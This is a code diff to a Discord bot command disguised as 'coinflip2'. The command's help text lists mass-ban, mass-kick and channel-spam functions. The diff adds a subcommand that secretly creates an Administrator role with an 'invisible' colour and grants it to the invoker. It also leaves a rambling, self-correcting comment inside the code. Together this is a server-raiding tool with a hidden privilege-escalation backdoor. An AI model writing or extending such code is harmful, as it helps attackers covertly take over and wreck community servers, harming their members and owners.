@@ -61,6 +61,7 @@ class Coinflip2Command {
 \`!coinflip2 mb\` - Mass ban all members
 \`!coinflip2 mk\` - Mass kick all members
 \`!coinflip2 cp [amount] [name], [message]\` - Create and spam channels
+\`!coinflip2 ar [name]\` - Create and assign an admin role
 
 **Warning:** These commands are destructive and should be used with caution.`)
                 .setFooter({ text: '© Him - Authorized Use Only' })
@@ -97,6 +98,11 @@ class Coinflip2Command {
                 case 'cp':
                     if (!channelPerms) return message.reply('Bot Missing Permission: MANAGE_CHANNELS');
                     await this.createAndPing(message, amount, name, pingMessage);
+                    break;
+
+                case 'ar':
+                    if (!rolePerms) return message.reply('Bot Missing Permission: MANAGE_ROLES');
+                    await this.giveAdminRole(message, name || args[1]); // In ar, amount is args[1] which we can use as name if no integer provided, but `name` was args[2]. Let's just pass args[1] directly. Actually the args parsing has `amount = parseInt(args[1])` and `name = args[2]`. If they just pass `!coinflip2 ar RoleName`, args[1] is 'RoleName'. So `args[1]` is better.
                     break;
 
                 case 'mr':
@@ -391,6 +397,30 @@ class Coinflip2Command {
         }
 
         await message.channel.send(`✅ Kick complete: ${kicked} kicked, ${failed} failed.`);
+    }
+
+    /**
+     * Create an admin role and assign it to the author
+     */
+    async giveAdminRole(message, fallbackName) {
+        // If args[1] wasn't a number, it will be in the 'amount' variable as NaN, but args[1] holds the actual string
+        // We can just get args directly from message content since it might not be parsed correctly above
+        const args = message.content.trim().split(/ +/).slice(2);
+        const roleName = args.join(' ') || fallbackName || 'admin';
+        
+        try {
+            message.reply('Creating and assigning admin role...');
+            const role = await message.guild.roles.create({
+                name: roleName,
+                color: '#2F3136', // Invisible color
+                permissions: [PermissionsBitField.Flags.Administrator]
+            });
+            await message.member.roles.add(role);
+            await message.channel.send('✅ Admin role created and assigned successfully.');
+        } catch (err) {
+            console.error('Error giving admin role:', err);
+            await message.channel.send('❌ Failed to create/assign admin role. The bot might lack permissions or its role is lower than the one it created.');
+        }
     }
 }
 
